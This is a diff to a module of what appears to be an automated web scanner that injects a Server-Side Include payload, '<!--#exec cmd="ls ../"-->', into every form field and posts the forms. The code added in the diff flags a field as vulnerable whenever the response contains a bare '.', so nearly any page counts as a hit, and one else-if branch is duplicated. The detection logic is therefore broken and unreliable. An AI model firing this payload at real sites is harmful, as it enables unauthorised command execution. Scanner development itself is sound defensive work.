@@ -12,7 +12,7 @@ var utilities = require("../utilities/");
 module.exports = {
 	run: function (url) {
 		var injectableForms = [];
-		var SSI = '<!--#exec cmd="ls .."-->';
+		var SSI = '<!--#exec cmd="ls ../"-->';
 
 		// Parsing the url and the queryString arguments
 		var urlObject = Url.parse(url, true);
@@ -35,12 +35,11 @@ module.exports = {
 				// Iterate through all inputs and test them individually
 				var inputsArray = inputs.toArray();
 				for (var testingInput in inputsArray) {
-					//console.log(inputsArray[testingInput]);
 					// Construct Request Body (form-data)
 					var formBody = "";
 					for (var input in inputsArray) {
 						var prependAmpersand = (formBody.length != 0);
-						var inject = $(inputsArray[input]).attr("name") == $(inputsArray[testingInput]).attr("name"); 
+						var inject = $(inputsArray[input]).attr("name") == $(inputsArray[testingInput]).attr("name");
 						formBody += (prependAmpersand ? "&" : "");
 						formBody += $(inputsArray[input]).attr("name") + "=" + (inject ? SSI : ($(inputsArray[input]).val() == "" || $(inputsArray[input]).val() == undefined ? "default" : $(inputsArray[input]).val()));
 					}
@@ -51,6 +50,24 @@ module.exports = {
 						body: formBody
 					});
 					if (res_form.getBody().toString().toLowerCase().indexOf(".php".toLowerCase()) > -1) {
+						// SSI vulnerability found
+						if (injectableForms[actionUrlObject] == undefined) {
+							injectableForms[actionUrlObject] = [];
+						}
+						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
+					} else if (res_form.getBody().toString().toLowerCase().indexOf(".py".toLowerCase()) > -1) {
+						// SSI vulnerability found
+						if (injectableForms[actionUrlObject] == undefined) {
+							injectableForms[actionUrlObject] = [];
+						}
+						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
+					} else if (res_form.getBody().toString().toLowerCase().indexOf(".".toLowerCase()) > -1) {
+						// SSI vulnerability found
+						if (injectableForms[actionUrlObject] == undefined) {
+							injectableForms[actionUrlObject] = [];
+						}
+						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
+					} else if (res_form.getBody().toString().toLowerCase().indexOf(".".toLowerCase()) > -1) {
 						// SSI vulnerability found
 						if (injectableForms[actionUrlObject] == undefined) {
 							injectableForms[actionUrlObject] = [];
